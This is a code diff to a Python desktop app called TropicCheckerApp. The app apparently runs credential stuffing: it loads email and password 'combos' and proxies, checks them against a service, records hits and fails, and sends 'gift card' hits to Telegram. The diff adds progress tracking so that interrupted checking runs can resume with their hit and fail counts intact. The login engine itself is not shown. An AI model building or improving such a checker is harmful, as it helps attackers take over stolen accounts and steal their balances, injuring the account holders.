@@ -35,6 +35,7 @@ class TropicCheckerApp(ctk.CTk):
         self.engine: CheckerEngine | None = None
         self.worker: threading.Thread | None = None
         self._hit_cards: list[ctk.CTkFrame] = []
+        self.progress = storage.ProgressTracker(storage.DATA_DIR)
 
         self._build_ui()
         self._load_saved_data()
@@ -249,6 +250,7 @@ class TropicCheckerApp(ctk.CTk):
         proxy_path = self.proxy_path_var.get()
         if Path(combo_path).exists():
             self.combos = storage.load_combos(combo_path)
+            self.progress.set_remaining_count(len(self.combos))
         if Path(proxy_path).exists():
             self.proxies = storage.load_proxies(proxy_path)
         hits_path = self.config.get("hits_path", str(storage.HITS_PATH))
@@ -257,7 +259,13 @@ class TropicCheckerApp(ctk.CTk):
         self._rebuild_hit_cards_from_lines()
 
     def _refresh_counts(self) -> None:
-        self.combo_count_label.configure(text=f"Combos loaded: {len(self.combos)}")
+        checked = self.progress.checked_count()
+        if checked:
+            self.combo_count_label.configure(
+                text=f"Combos: {len(self.combos)} remaining ({checked} checked)"
+            )
+        else:
+            self.combo_count_label.configure(text=f"Combos loaded: {len(self.combos)}")
         self.proxy_count_label.configure(text=f"Proxies loaded: {len(self.proxies)}")
 
     def _on_thread_change(self, *_args: Any) -> None:
@@ -284,9 +292,18 @@ class TropicCheckerApp(ctk.CTk):
         if not path:
             messagebox.showwarning("Combo File", "Select a combo file path first.")
             return
-        self.combos = storage.load_combos(path)
+        parsed = storage.load_combos(path)
+        previous = list(self.combos)
+        self.combos, skipped, message = self.progress.merge_reload(parsed, previous)
+        storage.save_combos(path, self.combos)
+        self.progress.set_remaining_count(len(self.combos))
         self._refresh_counts()
-        self._log(f"Loaded {len(self.combos)} combos from {path}")
+        if message:
+            self._log(message)
+        self._log(
+            f"Loaded {len(self.combos)} combos from {path} "
+            f"({self.progress.checked_count()} already checked)"
+        )
         self._persist_config()
 
     def _save_remaining_combos(self) -> None:
@@ -351,9 +368,9 @@ class TropicCheckerApp(ctk.CTk):
     def _update_stats(self, stats: CheckerStats) -> None:
         def _set() -> None:
             self.stat_labels["total"].configure(text=str(stats.total))
-            self.stat_labels["checked"].configure(text=str(stats.checked))
-            self.stat_labels["hits"].configure(text=str(stats.hits))
-            self.stat_labels["fails"].configure(text=str(stats.fails))
+            self.stat_labels["checked"].configure(text=str(stats.checked_total))
+            self.stat_labels["hits"].configure(text=str(stats.hits_total))
+            self.stat_labels["fails"].configure(text=str(stats.fails_total))
             self.stat_labels["cpm"].configure(text=f"{stats.cpm:.1f}")
 
         self.after(0, _set)
@@ -481,10 +498,15 @@ class TropicCheckerApp(ctk.CTk):
         if combo in self.combos:
             self.combos.remove(combo)
 
+    def _mark_checked(self, result: AccountResult) -> None:
+        self.progress.mark_checked(result.email, result.password, success=result.success)
+        self.progress.set_remaining_count(len(self.combos))
+
     def _on_hit(self, result: AccountResult) -> None:
         from .telegram_notify import notify_gift_card_hit
 
         self._remove_combo(result)
+        self._mark_checked(result)
         line = result.summary_line()
         self.hits.insert(0, line)
         self.hit_results.insert(0, result)
@@ -495,6 +517,7 @@ class TropicCheckerApp(ctk.CTk):
 
     def _on_fail(self, result: AccountResult) -> None:
         self._remove_combo(result)
+        self._mark_checked(result)
 
     def _start_checking(self) -> None:
         if self.worker and self.worker.is_alive():
@@ -510,6 +533,7 @@ class TropicCheckerApp(ctk.CTk):
         self._persist_config()
 
         combos_snapshot = list(self.combos)
+        checked_baseline = self.progress.checked_count()
         self.engine = CheckerEngine(
             combos=combos_snapshot,
             proxies=self.proxies,
@@ -519,6 +543,16 @@ class TropicCheckerApp(ctk.CTk):
             on_progress=self._update_stats,
             on_log=self._log,
         )
+        self.engine.stats = CheckerStats(
+            total=len(combos_snapshot) + checked_baseline,
+            checked_baseline=checked_baseline,
+            hits_baseline=self.progress.hits_count(),
+            fails_baseline=self.progress.fails_count(),
+        )
+        if checked_baseline:
+            self._log(
+                f"Resuming at {checked_baseline} checked, {len(combos_snapshot)} remaining"
+            )
 
         def run() -> None:
             self.engine.run()
